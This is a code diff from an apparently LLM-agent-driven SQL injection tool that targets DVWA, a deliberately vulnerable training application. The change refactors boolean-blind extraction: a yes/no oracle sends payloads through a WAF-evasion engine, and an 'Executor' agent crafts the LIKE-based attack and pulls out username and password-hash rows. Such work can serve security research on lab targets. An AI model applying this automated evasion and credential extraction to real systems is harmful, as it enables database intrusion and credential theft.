@@ -15,7 +15,6 @@ from typing import Callable, Optional
 
 from . import knowledge
 from .agents import Analyst, Executor, Planner
-from .blind import BlindExtractor
 from .discovery import ProbeResult, SchemaDiscovery, pick_credential_columns
 from .dvwa import DVWAClient
 from .evasion import EvasionEngine
@@ -140,7 +139,7 @@ class Orchestrator:
             # Respaldo INFORMADO (no prueba a ciegas): solo si el reconocimiento ya vio que el
             # booleano es viable.
             if not success and recon.signals.get("boolean"):
-                blind = self._blind_fallback(engine, level, deadline, counter, say, payload_log)
+                blind = self._run_blind(engine, level, deadline, counter, say, payload_log)
                 if blind:
                     extracted, success = [blind], True
                     trace.append(f"extracción boolean-blind (LIKE): {blind}")
@@ -148,7 +147,7 @@ class Orchestrator:
             # Técnica elegida: boolean-blind. UNION no pasa el WAF -> se va directo a la ciega.
             say("[Recon] UNION no pasa el WAF; el booleano sí → extracción ciega directa "
                 "(sin intentar UNION)")
-            blind = self._blind_fallback(engine, level, deadline, counter, say, payload_log)
+            blind = self._run_blind(engine, level, deadline, counter, say, payload_log)
             if blind:
                 extracted, success = [blind], True
                 trace.append(f"extracción boolean-blind (LIKE): {blind}")
@@ -172,8 +171,9 @@ class Orchestrator:
             slm_metrics=self.llm.metrics() if hasattr(self.llm, "metrics") else {},
         )
 
-    def _blind_fallback(self, engine, level, deadline, counter, say, payload_log):
-        """Extracción boolean-blind con LIKE cuando UNION está bloqueado pero el booleano pasa."""
+    def _blind_oracle(self, engine, level, deadline, counter, payload_log):
+        """Oráculo sí/no para la extracción ciega: envía por el motor de evasión y devuelve True si
+        la condición inyectada fue verdadera (el objetivo devolvió fila)."""
         def oracle(payload: str) -> bool:
             while time.monotonic() < deadline:
                 p, pipe = engine.next_payload(payload)
@@ -189,23 +189,18 @@ class Orchestrator:
                 engine.record(pipe, p, blocked=False)
                 return bool(resp.rows)
             return False
+        return oracle
 
-        candidates: Optional[tuple[list[str], list[str]]] = None
+    def _run_blind(self, engine, level, deadline, counter, say, payload_log):
+        """Extracción boolean-blind: el orquestador arma el oráculo y los candidatos de columna; el
+        EXECUTOR genera la forma del ataque y maneja el BlindExtractor (herramienta) para extraer."""
+        oracle = self._blind_oracle(engine, level, deadline, counter, payload_log)
+        user_cands, pass_cands = self._credential_candidates(say)
+        like = self.executor.craft_blind(say)   # 1 llamada: el Executor GENERA la forma del ataque
         for quote in ("", "'"):   # medium = entero (sin comilla); otros = cadena
-            bx = BlindExtractor(oracle, quote=quote, say=say)
-            if not bx.confirm():
-                continue
-            say(f"[Blind] inyección booleana confirmada (comillas={quote!r}); "
-                f"UNION bloqueado → extracción ciega con LIKE")
-            # Candidatos de columna: el Analyst (LLM) los propone y sqlmap los aterriza (una vez).
-            if candidates is None:
-                candidates = self._credential_candidates(say)
-            bx.user_cols, bx.pass_cols = candidates
-            row = bx.dump_first_row()
-            if row and row.get("hash"):
-                say(f"[Orchestrator] SUCCESS (boolean-blind, {bx.requests} sondeos) — {row}")
+            row = self.executor.extract_blind(oracle, quote, user_cands, pass_cands, like, say)
+            if row:
                 return row
-            return None
         return None
 
     def _credential_candidates(self, say: Logger) -> tuple[list[str], list[str]]:
